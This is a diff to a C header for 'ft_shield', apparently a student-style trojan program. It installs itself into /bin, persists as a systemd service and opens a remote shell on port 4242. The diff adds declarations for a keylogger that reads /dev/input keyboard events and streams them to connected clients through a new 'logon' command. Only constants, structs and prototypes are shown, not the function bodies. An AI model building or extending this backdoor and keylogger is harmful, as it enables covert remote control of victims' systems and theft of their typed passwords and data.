@@ -22,8 +22,17 @@
 # include <sys/select.h>
 # include <sys/un.h>
 # include <sys/wait.h>
+# include <sys/ioctl.h>
+# include <linux/input.h>
+# include <sys/stat.h>
+# include <dirent.h>
 
 #define DEST_PATH "/bin/ft_shield"
+#define DEV_PATH "/dev/input/"
+#define MAX_EVENTS 3
+#define KEY_PRESSED 1
+#define KEY_RELEASED 0
+#define KEY_REPEATED 2
 #define DEST_SERVICE "/etc/systemd/system/ft_shield.service"
 #define LISTENING_PORT 4242
 #define MAX_CONECTIONS 10
@@ -34,12 +43,13 @@
 #define HELP "\
 ---------------------------------\n\
 ?     - Shows help\n\
-shell - Spawn shell in port 4242\n\
 clear - Clear terminal\n\
+logon - Spawns a keylogger in port 4242\n\
+shell - Spawn shell in port 4242\n\
 ---------------------------------\n\
 "
 #define REMOTE_OPENED "New remote shell opened in port 4242\n"
-#define MANY_CLIENTS "Connection denied, to many clients\n"
+#define MANY_CLIENTS "Connection denied, too many clients\n"
 #define CLEAR_CODE "\033[H\033[2J"
 
 #define SERVICE "\
@@ -59,17 +69,21 @@ WantedBy=multi-user.target\n\
 "
 
 typedef struct s_list t_list;
+typedef struct input_event t_event;
 
 typedef enum e_status {
 	HANDSHAKE,
 	CONNECTED,
-	SHELL
+	SHELL,
+	KEYLOGGER
 } t_status;
 
 typedef struct s_client {
 	int			fd;
 	t_status	status;
 	char		*shell_code;
+	char		*response_bffr;
+	char		disconnect;
 }	t_client;
 
 typedef struct s_server {
@@ -84,11 +98,22 @@ typedef struct s_server {
 int		handle_input(t_server *server, int index, char *buffer);
 void	handle_handshake(t_server *server, int index, char *input);
 int		handle_commands(t_server *server, int index, char *input);
-
+void	delete_client(t_server *server, int index);
 
 /* shell.c */
 // void	*shell_function(void *data);
 void	*shell_function(t_server *server, int index);
+
+/* keylogger.c */
+void	*keylogger_function(t_server *server, int index);
+
+/* keylogger_utils.c */
+int hasEventTypes(int fd, unsigned long evbit_to_check);
+int hasKeys(int fd);
+int hasRelativeMovement(int fd);
+int hasAbsoluteMovement(int fd);
+int hasSpecificKeys(int fd, int *keys, size_t num_keys);
+int keyboardFound(char *path, int *keyboard_fd);
 
 /* service.c */
 void	create_service(void);
@@ -109,6 +134,9 @@ void	copy_file(char *src, char *dst);
 
 void	ft_dprintf(int fd, const char *format, ...);
 void	ft_perror(char *str);
+
+char	*ft_strdup(const char *s1);
+void	add2buffer(t_client *client, char *str);
 
 /* utils/list.c */
 typedef struct s_list
